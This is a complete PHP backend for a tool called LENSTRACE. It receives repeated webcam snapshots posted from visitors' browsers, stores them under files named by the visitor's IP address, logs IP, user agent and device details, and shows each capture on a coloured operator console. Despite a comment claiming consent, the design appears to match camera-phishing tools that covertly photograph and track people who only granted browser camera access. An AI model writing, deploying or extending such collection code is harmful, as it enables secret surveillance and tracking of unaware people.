<?php
// lensbeacon.php — LENSTRACE snapshot backend
// Ethical: snapshots only after explicit camera permission in browser.

declare(strict_types=1);
date_default_timezone_set('UTC');

header('Content-Type: application/json; charset=utf-8');

$raw = file_get_contents('php://input', false, null, 0, 1024 * 1024);
if ($raw === false || trim($raw) === '') {
    http_response_code(400);
    echo json_encode(['ok'=>false, 'error'=>'empty body']);
    exit;
}

$data = json_decode($raw, true, 8);
if ($data === null && json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode(['ok'=>false, 'error'=>'invalid json', 'msg'=>json_last_error_msg()]);
    exit;
}

$type    = isset($data['type']) ? (string)$data['type'] : 'meta';
$consent = !empty($data['consent']) && $data['consent'] === true;

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ip = explode(',', $ip)[0];
$ip = trim($ip);
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ts = gmdate('Y-m-d H:i:s') . ' UTC';

$device = isset($data['deviceLabel']) ? (string)$data['deviceLabel'] : 'unknown';
$width  = isset($data['width']) && is_numeric($data['width']) ? (int)$data['width'] : null;
$height = isset($data['height']) && is_numeric($data['height']) ? (int)$data['height'] : null;
$fps    = isset($data['fps']) && is_numeric($data['fps']) ? (float)$data['fps'] : null;
$seq    = isset($data['seq']) && is_numeric($data['seq']) ? (int)$data['seq'] : null;
$capturedAt = isset($data['capturedAt']) ? (string)$data['capturedAt'] : null;
$interval   = isset($data['intervalSeconds']) && is_numeric($data['intervalSeconds'])
    ? (int)$data['intervalSeconds'] : null;

$status = $consent ? 'CAM_ACCESS_GRANTED' : 'CAM_ACCESS_REFUSED';

// Ensure directories
$rootCapture = __DIR__ . DIRECTORY_SEPARATOR . 'capture';
$snapDir     = $rootCapture . DIRECTORY_SEPARATOR . 'snapshots';

if (!is_dir($rootCapture) && !mkdir($rootCapture, 0755, true)) {
    http_response_code(500);
    echo json_encode(['ok'=>false, 'error'=>'failed to create capture dir']);
    exit;
}
if (!is_dir($snapDir) && !mkdir($snapDir, 0755, true)) {
    http_response_code(500);
    echo json_encode(['ok'=>false, 'error'=>'failed to create snapshot dir']);
    exit;
}

$logFile = $rootCapture . DIRECTORY_SEPARATOR . 'lenstrace.log';

// Base entry
$entry = [
    'timestamp'   => $ts,
    'ip'          => $ip,
    'ua'          => $ua,
    'consent'     => $consent,
    'type'        => $type,
    'device'      => $device,
    'width'       => $width,
    'height'      => $height,
    'fps'         => $fps,
    'seq'         => $seq,
    'capturedAt'  => $capturedAt,
    'intervalSec' => $interval,
    'status'      => $status,
    'file'        => null,
];

$safeIp    = str_replace(["\n","\r"], '', $ip);
$safeTs    = str_replace(["\n","\r"], '', $ts);
$safeDev   = str_replace(["\n","\r"], '', $device);
$resStr    = ($width && $height) ? "{$width}x{$height}" : 'unknown';
$fpsStr    = $fps !== null ? $fps . ' fps' : 'unknown';
$seqStr    = $seq !== null ? (string)$seq : '-';
$filePath  = 'N/A';

// If it's a snapshot event and we have imageData, decode and store
if ($type === 'snapshot' && $consent && !empty($data['imageData'])) {
    $img = $data['imageData'];
    if (strpos($img, 'data:image/') === 0) {
        $parts = explode(',', $img, 2);
        if (count($parts) === 2) {
            $bin = base64_decode($parts[1], true);
            if ($bin !== false && strlen($bin) < 5 * 1024 * 1024) { // max 5MB
                $safeIpTag = preg_replace('/[^0-9a-fA-F:._-]/', '_', $safeIp);
                $seqTag    = $seqStr !== '-' ? $seqStr : 'x';
                $fnameBase = 'lenstrace_' . date('Ymd_His') . '_' . $safeIpTag . '_seq' . $seqTag;
                $fname     = $fnameBase . '.jpg';
                $fullPath  = $snapDir . DIRECTORY_SEPARATOR . $fname;

                if (file_put_contents($fullPath, $bin, LOCK_EX) !== false) {
                    $filePath = 'capture/snapshots/' . $fname;
                    $entry['file'] = $filePath;
                    $status = 'SNAPSHOT_STORED';
                    $entry['status'] = $status;
                }
            }
        }
    }
}

// Human log line
$human = sprintf(
    "[%s] IP: %s | TYPE: %s | CONSENT: %s | DEVICE: %s | RES: %s | FPS: %s | SEQ: %s | FILE: %s | STATUS: %s\n",
    $safeTs,
    $safeIp,
    $type,
    $consent ? 'GRANTED' : 'REFUSED',
    $safeDev,
    $resStr,
    $fpsStr,
    $seqStr,
    $filePath,
    $status
);
$jsonLine = json_encode($entry, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . PHP_EOL;

$ok = file_put_contents($logFile, $human . $jsonLine, FILE_APPEND | LOCK_EX);
if ($ok === false) {
    http_response_code(500);
    echo json_encode(['ok'=>false, 'error'=>'failed to write log']);
    exit;
}

// Enhanced terminal live output with colors
if ($type === 'snapshot' && $status === 'SNAPSHOT_STORED') {
    $box = [];
    $box[] = "\033[35m📡 LENSTRACE — SNAPSHOT CAPTURED\033[0m";
    $box[] = "\033[36m┌─────────────────────────────────────────────────────────────┐\033[0m";
    $box[] = sprintf("\033[36m│\033[0m IP         : \033[33m%-41s\033[36m │\033[0m", substr($safeIp, 0, 41));
    $box[] = sprintf("\033[36m│\033[0m Timestamp  : \033[32m%-41s\033[36m │\033[0m", $safeTs);
    $box[] = sprintf("\033[36m│\033[0m Consent    : \033[32m%-41s\033[36m │\033[0m", $consent ? 'GRANTED' : 'REFUSED');
    $box[] = sprintf("\033[36m│\033[0m Device     : \033[37m%-41s\033[36m │\033[0m", substr($safeDev, 0, 41));
    $box[] = sprintf("\033[36m│\033[0m Resolution : \033[36m%-41s\033[36m │\033[0m", $resStr);
    $box[] = sprintf("\033[36m│\033[0m Snapshot # : \033[35m%-41s\033[36m │\033[0m", $seqStr);
    $box[] = sprintf("\033[36m│\033[0m File       : \033[34m%-41s\033[36m │\033[0m", substr($filePath, 0, 41));
    $box[] = "\033[36m└─────────────────────────────────────────────────────────────┘\033[0m";

    foreach ($box as $line) {
        error_log($line);
    }
}

echo json_encode(['ok'=>true, 'status'=>$status, 'file'=>$filePath]);
exit;